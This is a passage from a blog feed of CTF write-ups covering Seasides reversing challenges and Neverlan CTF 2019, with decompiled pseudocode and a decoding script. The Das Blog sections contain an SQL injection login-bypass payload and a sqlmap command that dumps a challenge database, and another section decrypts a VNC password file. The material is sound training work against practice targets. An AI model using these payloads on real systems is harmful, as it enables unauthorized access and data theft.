href="/img/seasides/nondbg.png" class="gallery-item"><img src="/img/seasides/nondbg.png"></a></p><p><a href="/files/seasides/nondbg">Download File</a></p><p><a href="/img/seasides/non1.png" class="gallery-item"><img src="/img/seasides/non1.png"></a>  </p><p>Now Unfortunately, I had to bootup my Windows for decompiling with IDA Pro :(</p><p>After debugging, I found that <strong>main()</strong> is calling two functions named as <strong>lencheck()</strong> and <strong>inpcheck()</strong>.</p><h4 id="Psuedocodes"><a href="#Psuedocodes" class="headerlink" title="Psuedocodes"></a>Psuedocodes</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4;</span><br><span class="line">  <span class="keyword">int</span> v5; </span><br><span class="line">  <span class="keyword">char</span> *v6; </span><br><span class="line">  <span class="keyword">int</span> v7;</span><br><span class="line">  <span class="keyword">int</span> v8; </span><br><span class="line"></span><br><span class="line">  v8 = ptrace(<span class="number">0</span>, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Enter Input:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v4);</span><br><span class="line">  v7 = lencheck(&amp;v4);</span><br><span class="line">  v6 = &amp;v4;</span><br><span class="line">  v5 = inpcheck(&amp;v4, v7, v8);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">14</span> )</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;\n\nBetter Luck next time\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The lencheck function adds 10 to our input string’s length and returns it in v7 variable.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">lencheck</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(a1) + <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When I moved on towards the inpcheck function, It took me a second to guess the input as it was in our plain sight.<br>Also I saw that our Input String’s Length has to be 14 to output anything in our flag format which was sea{…}sides</p><p><a href="/img/seasides/non3.png" class="gallery-item"><img src="/img/seasides/non3.png"></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">inpcheck</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; </span><br><span class="line">  __int64 v4; </span><br><span class="line">  __int64 result; </span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">7</span>]; </span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">int</span> v8; </span><br><span class="line">  <span class="keyword">int</span> v9; </span><br><span class="line">  <span class="keyword">int</span> v10; </span><br><span class="line">  <span class="keyword">int</span> i; </span><br><span class="line">  v3 = a3;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  i = a2 - <span class="number">11</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;\nPtrace1: &quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10</span> * (v3 + <span class="number">1</span>) == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( i &gt;= a2 - <span class="number">17</span> &amp;&amp; v10 &lt;= <span class="number">6</span> )</span><br><span class="line">        s1[v10++] = a1[i--];</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;buGng$F&quot;</span>, <span class="number">7u</span>LL) )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= v10; ++i )</span><br><span class="line">          v7[i] = a1[i];</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;AntI_D3&quot;</span>, <span class="number">7u</span>LL) )</span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">0L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v8 = <span class="number">7</span>;</span><br><span class="line">          printflag(a1);</span><br><span class="line">          result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v9 + v8);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printbad();</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I tried <strong>AntI_D3buGng$F</strong> and we got our flag as output.</p><p><a href="/img/seasides/non2.png" class="gallery-item"><img src="/img/seasides/non2.png"></a>  </p><h1 id="BreakThis"><a href="#BreakThis" class="headerlink" title="BreakThis"></a>BreakThis</h1><h3 id="Task-Description-3"><a href="#Task-Description-3" class="headerlink" title="Task Description :"></a>Task Description :</h3><p><a href="/img/seasides/breakthis.png" class="gallery-item"><img src="/img/seasides/breakthis.png"></a>  </p><p><a href="/files/seasides/breakthis">Download File</a></p><p><a href="/img/seasides/break1.png" class="gallery-item"><img src="/img/seasides/break1.png"></a>  </p><p>This task was pretty simple when you’ve got the Hex Rays Decompiler Plugin.<br>I didn’t try it the usual way.</p><h4 id="Psuedocode-main"><a href="#Psuedocode-main" class="headerlink" title="Psuedocode (main)"></a>Psuedocode (main)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3;  </span><br><span class="line">  <span class="keyword">void</span> *s;  </span><br><span class="line">  <span class="keyword">size_t</span> v5;  </span><br><span class="line">  <span class="keyword">size_t</span> v6;  </span><br><span class="line">  <span class="keyword">char</span> *v7; </span><br><span class="line">  <span class="keyword">char</span> *v8; </span><br><span class="line">  <span class="keyword">char</span> *s1; </span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please_find_me.exe &lt;&lt;key_goes_here&gt;&gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">  s = <span class="built_in">malloc</span>(v3 + <span class="number">1</span>);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, v5 + <span class="number">1</span>);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)s, argv[<span class="number">1</span>], v6);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)base64(s);</span><br><span class="line">  v8 = (<span class="keyword">char</span> *)rot13(v7);</span><br><span class="line">  s1 = (<span class="keyword">char</span> *)uuencode(v8);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, flag_encoded) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;GG!, now put that flag on ye head and fly away!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nope, wrong flag ye got there m8, try again!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I observed some conversions of our input into various encodings <em>base64, rot13, and uuencode</em>.<br>I knew about the first two, but wth is uuencode…</p><p>No Problem, <strong>Linux Man Page</strong> takes care of that for us.<br>uuencode and uudecode are used to transmit binary files over transmission mediums that do not support other than simple ASCII data.<br>You can read more about it <a href="https://linux.die.net/man/1/uuencode">here</a>.</p><p>It was also easy to find the <em>flag_encoded</em> variable which was declared.<br><a href="/img/seasides/encflag.PNG" class="gallery-item"><img src="/img/seasides/encflag.PNG"></a>  </p><p>I simply wrote a python script to reverse the encoding process.<br>And FYI the <strong>begin &amp; end line</strong> is necessary for using uuencode or else it’ll throw an error.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> codecs <span class="keyword">import</span> decode,encode</span><br><span class="line"><span class="keyword">import</span> uu</span><br><span class="line">enc_str = <span class="string">b&#x27;begin 666 &lt;data&gt;\n8&lt;#))=7(R:VEO57$P36$Q;6Y*17EP:CT]\n \nend\n&#x27;</span></span><br><span class="line">un_enc_str=decode(enc_str,<span class="string">&#x27;uu&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;lev1 uudecode: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(un_enc_str)</span><br><span class="line">rot13_str = un_enc_str.encode(<span class="string">&#x27;rot13&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;lev2 rot13: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(rot13_str)</span><br><span class="line">base64_str = rot13_str.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;lev3 base64: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(base64_str)</span><br></pre></td></tr></table></figure><p><a href="/img/seasides/uuencode.png" class="gallery-item"><img src="/img/seasides/uuencode.png"></a>  </p><p><a href="/img/seasides/break2.png" class="gallery-item"><img src="/img/seasides/break2.png"></a>  </p><p>Thanks for Reading this writeup..<br>Subscribe to my Newsletter for more updates regarding CTFs.<br>Also Feedback is always appreciated.<br>It won’t take much time though.  </p><p>And Keep Escalating the Privileges<br>Happy Hacking !!</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/owasp-seasides/">owasp seasides</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/thevice/">thevice</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/breakthis/">breakthis</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/nondbg/">nondbg</category>
      
      
      <comments>https://mrt4ntr4.github.io/Seasides-CTF-Writeups/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Neverlan CTF 2019</title>
      <link>https://mrt4ntr4.github.io/Neverlan-CTF-Writeups/</link>
      <guid>https://mrt4ntr4.github.io/Neverlan-CTF-Writeups/</guid>
      <pubDate>Sun, 03 Feb 2019 06:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/neverlan/neverthumb.png" title="banner" class="gallery-item"><img src="/img/neverlan/neverthumb.png" alt="banner"></a></p><p>Neverlan CTF 2019 was both easy and fun.  </p><p>I was able to solve some of the challs from every category and our team secured ‘35th’ positon at the last.  </p><p><a href="/img/neverlanscore.png" class="gallery-item"><img src="/img/neverlanscore.png"></a></p><p>This writeup includes the following Challenges.</p><h3 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h3><p><a href="#binary1">Binary 1</a><br><a href="#binary2">Binary 2</a><br><a href="#binary3">Binary 3</a>   </p><h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><p><a href="#forensic1">Forensic 1</a>  </p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p><a href="#reacttothis">React To This</a><br><a href="#dasblog1">Das Blog 1</a><br><a href="#dasblog2">Das Blog 2</a><br><a href="#console">Console</a>  </p><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p><a href="#itstokeyz">Its to KeyZ</a><br><a href="#jackalopeliveset">Jackalope’s Live set</a>  </p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p><a href="#zeroc00lbruh">Zero C00l Bruh!!</a>  </p><p>Ok lets get our hands dirty !! in the Binary World. XD</p><h1 id="Binary1"><a href="#Binary1" class="headerlink" title="Binary1"></a>Binary1</h1><p>Task:<br><a href="/img/neverlan/binary1thumb.png" class="gallery-item"><img src="/img/neverlan/binary1thumb.png"></a></p><p>using command </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -r -p users_db | base64 -d | grep <span class="string">&#x27;flag&#123;&#x27;</span></span><br></pre></td></tr></table></figure><p>I Found this… </p><p><a href="/img/neverlan/b12.png" class="gallery-item"><img src="/img/neverlan/b12.png"></a></p><h1 id="Binary2"><a href="#Binary2" class="headerlink" title="Binary2"></a>Binary2</h1><p>Task:<br><a href="/img/neverlan/binary2thumb.png" class="gallery-item"><img src="/img/neverlan/binary2thumb.png"></a></p><p>For this Challenge I had to boot my Windows machine to run the exe .<br>:P I have a Wine Problem ..</p><p><a href="/img/neverlan/n1.PNG" class="gallery-item"><img src="/img/neverlan/n1.PNG"></a></p><p>The Application is made using .NET.<br>I searched some Decompilers for .NET Applications<br>And Found dotPeek from JetBrains, and this was enough to solve this chall.<br>I decompiled it and found <strong>CheckUsername()</strong> and <strong>CheckPassword()</strong> functions.  </p><p><a href="/img/neverlan/n2.PNG" class="gallery-item"><img src="/img/neverlan/n2.PNG"></a></p><p>I noticed that the fields were declared. </p><p><a href="/img/neverlan/n3.PNG" class="gallery-item"><img src="/img/neverlan/n3.PNG"></a></p><p>And then I simply Logged IN using the creds …<br>BoomYa!!!</p><p><a href="/img/neverlan/n4.PNG" class="gallery-item"><img src="/img/neverlan/n4.PNG"></a></p><h1 id="Binary3"><a href="#Binary3" class="headerlink" title="Binary3"></a>Binary3</h1><p>Task:<br><a href="/img/neverlan/binary3thumb.png" class="gallery-item"><img src="/img/neverlan/binary3thumb.png"></a></p><p>After making it executable by changing permissions, I got a login prompt.<br>Fine!! Till Now.<br>After Reversin with IDA i saw an ADMIN string and tried that in the username but password was a bit complicated.  </p><p><a href="/img/neverlan/b21.png" class="gallery-item"><img src="/img/neverlan/b21.png"></a>  </p><p>Researching a bit further…</p><p><a href="/img/neverlan/b22.png" class="gallery-item"><img src="/img/neverlan/b22.png"></a>  </p><p>I found that its issuing a GET Request to <a href="http://www.gr3yron1n.com/">www.gr3yROn1n.com</a></p><p><a href="/img/neverlan/b23.png" class="gallery-item"><img src="/img/neverlan/b23.png"></a>  </p><p>Then Checking the References took me to the <em>d</em> function</p><p><a href="/img/neverlan/b24.png" class="gallery-item"><img src="/img/neverlan/b24.png"></a>  </p><p>I observed that the <em>d</em> function was not being called by the main.<br>So I did it manually on GDB.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> ((char*(*)()) d)()</span><br></pre></td></tr></table></figure><p><a href="/img/neverlan/b25.png" class="gallery-item"><img src="/img/neverlan/b25.png"></a>  </p><h1 id="Forensic1"><a href="#Forensic1" class="headerlink" title="Forensic1"></a>Forensic1</h1><p>Task:<br><a href="/img/neverlan/siththumb.png" class="gallery-item"><img src="/img/neverlan/siththumb.png"></a></p><p>The Forensic Challenges were not too fun..<br>As it required for us to download a 6.2 GB file.. XD..<br>This can be a limitation for some players.  </p><p>But I was lucky to download that in just 15 mins. LOL !!<br>Importing and Booting up the OVA in VirtualBox I saw that a user was already there..<br>I logged in with the Password given in the TASK INFO.</p><p><a href="/img/neverlan/sith1.png" class="gallery-item"><img src="/img/neverlan/sith1.png"></a></p><p>I discovered a <strong>.vnc</strong> dir in home dir and there existed a <strong>passwd</strong> file which we can easily decrypt using the <strong>vnc passwd decryptor</strong>  </p><p>GitHub LINK : <a href="https://github.com/jeroennijhof/vncpwd">https://github.com/jeroennijhof/vncpwd</a>  </p><p>I cloned the repo and transferred the <em>passwd</em> file into my local machine using <strong>python -m SimpleHTTPServer</strong></p><p>And That was it..</p><p>Boom Ya!!!</p><p><a href="/img/neverlan/sith2.png" class="gallery-item"><img src="/img/neverlan/sith2.png"></a>  </p><h1 id="ReactToThis"><a href="#ReactToThis" class="headerlink" title="ReactToThis"></a>ReactToThis</h1><p>Task:<br><a href="/img/neverlan/reacttothisthumb.png" class="gallery-item"><img src="/img/neverlan/reacttothisthumb.png"></a></p><p>This Challenge was too easy…<br>It just needed us to see the source files carefully.   </p><p>There existed <em>Admin.js</em> which contains the flag for the chall.</p><p><a href="/img/neverlan/react1.png" class="gallery-item"><img src="/img/neverlan/react1.png"></a>  </p><p>Just Walking Now !!  </p><p><a href="/img/neverlan/react2.png" class="gallery-item"><img src="/img/neverlan/react2.png"></a>  </p><h1 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h1><p>Task:<br><a href="/img/neverlan/consolethumb.png" class="gallery-item"><img src="/img/neverlan/consolethumb.png"></a></p><p>The Source is the Master here and the functions are the Slave…   XD</p><p><a href="/img/neverlan/console1.png" class="gallery-item"><img src="/img/neverlan/console1.png"></a></p><p>I saw that there is an if condition… and as the challenge says to use the console…<br>I bypassed the condition statement using the Developer Console available in the browser.</p><p><a href="/img/neverlan/console2.png" class="gallery-item"><img src="/img/neverlan/console2.png"></a></p><h1 id="DasBlog1"><a href="#DasBlog1" class="headerlink" title="DasBlog1"></a>DasBlog1</h1><p>Task:<br><a href="/img/neverlan/dasblog1thumb.png" class="gallery-item"><img src="/img/neverlan/dasblog1thumb.png"></a></p><p>This was a Basic SQL Injection if u had the right and the most common payload. LOOL !!  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload : <span class="string">&#x27;or 1=1-- </span></span><br></pre></td></tr></table></figure><p>And plz don’t forget the trailing spaces after the <strong>- -</strong>.  </p><p><a href="/img/neverlan/das11.png" class="gallery-item"><img src="/img/neverlan/das11.png"></a></p><p>We were logged in as Johnny with permissions as <strong>admin</strong>.  </p><p><a href="/img/neverlan/das12.png" class="gallery-item"><img src="/img/neverlan/das12.png"></a></p><p>After Clicking on the<br><em>click here to go to the main page</em></p><p>We saw our flag in one of the posts…</p><p><a href="/img/neverlan/das13.png" class="gallery-item"><img src="/img/neverlan/das13.png"></a></p><h1 id="DasBlog2"><a href="#DasBlog2" class="headerlink" title="DasBlog2"></a>DasBlog2</h1><p>Task:<br><a href="/img/neverlan/dasblog2thumb.png" class="gallery-item"><img src="/img/neverlan/dasblog2thumb.png"></a></p><p>Ahh !! After using the same payload for SQL Injection, we are logged in as USER.<br>Now, here we have to think a little smarter.</p><p><a href="/img/neverlan/das21.png" class="gallery-item"><img src="/img/neverlan/das21.png"></a></p><p>Next I tried dumping the database using <strong>sqlmap</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;https://challenges.neverlanctf.com:1130/login.php&#x27;</span> --data=<span class="string">&#x27;Username=1&amp;Password=1&amp;submit=Login&#x27;</span> --dump</span><br></pre></td></tr></table></figure><p><a href="/img/neverlan/das22.png" class="gallery-item"><img src="/img/neverlan/das22.png"></a></p><p>And Here we go!!  </p><p>The flag was in the Admin Records.   </p><p><a href="/img/neverlan/das23.png" class="gallery-item"><img src="/img/neverlan/das23.png"></a></p><h1 id="ItsToKeyZ"><a href="#ItsToKeyZ" class="headerlink" title="ItsToKeyZ"></a>ItsToKeyZ</h1><p>Task:<br><a href="/img/neverlan/keyzthumb.png" class="gallery-item"><img src="/img/neverlan/keyzthumb.png"></a></p><p>I found this Github Repo :<br><a href="https://github.com/durkinza/KeyZ">https://github.com/durkinza/KeyZ</a><br>I Cloned this to my local Machine, and after tinkering around a bit it yielded our flag.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./key -g passwords.keyz flag</span><br></pre></td></tr></table></figure><p><a href="/img/neverlan/keyz1.png" class="gallery-item"><img src="/img/neverlan/keyz1.png"></a></p><h1 id="JackalopeLiveSet"><a href="#JackalopeLiveSet" class="headerlink" title="JackalopeLiveSet"></a>JackalopeLiveSet</h1><p>Task:<br><a href="/img/neverlan/jackthumb.png" class="gallery-item"><img src="/img/neverlan/jackthumb.png"></a></p><p>I found this LiveStream Link </p><p><a href="https://chew.tv/s7a73farm/dj-jackalopes-neverlanctf-mix">https://chew.tv/s7a73farm/dj-jackalopes-neverlanctf-mix</a></p><p>and Eventually found the Flag at <strong>23:30</strong> .</p><p><a href="/img/neverlan/jack.jpeg" class="gallery-item"><img src="/img/neverlan/jack.jpeg"></a></p><h1 id="ZeroC00lBruh"><a href="#ZeroC00lBruh" class="headerlink" title="ZeroC00lBruh"></a>ZeroC00lBruh</h1><p>Task:<br><a href="/img/neverlan/zerocoolthumb.png" class="gallery-item"><img src="/img/neverlan/zerocoolthumb.png"></a></p><p>This Challenge also required the right tools and understanding both…. XD  </p><p>We can use <strong>steghide</strong> to get the hidden text with the Passphrase as <strong>neverlanctf</strong>.</p><p><a href="/img/neverlan/zero1.png" class="gallery-item"><img src="/img/neverlan/zero1.png"></a></p><p>Next, I tried to decrypt the string using the Vignere Cipher Decoder From <a href="https://cryptii.com/pipes/vigenere-cipher">Cryptii</a>..</p><p>And Most Important part was guessing the Key …<br>This part was fun as the key was <strong>hackers</strong>…</p><p><a href="/img/neverlan/zero2.png" class="gallery-item"><img src="/img/neverlan/zero2.png"></a></p><p>At the end the flag was ::</p><p>flag{myfavoritemovie}</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/neverlan/">neverlan</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/2019/">2019</category>
      
      
      <comments>https://mrt4ntr4.github.io/Neverlan-CTF-Writeups/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>BITS CTF 2019</title>
      <link>https://mrt4ntr4.github.io/Bits-CTF-Writeups/</link>
      <guid>https://mrt4ntr4.github.io/Bits-CTF-Writeups/</guid>
      <pubDate>Sun, 03 Feb 2019 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
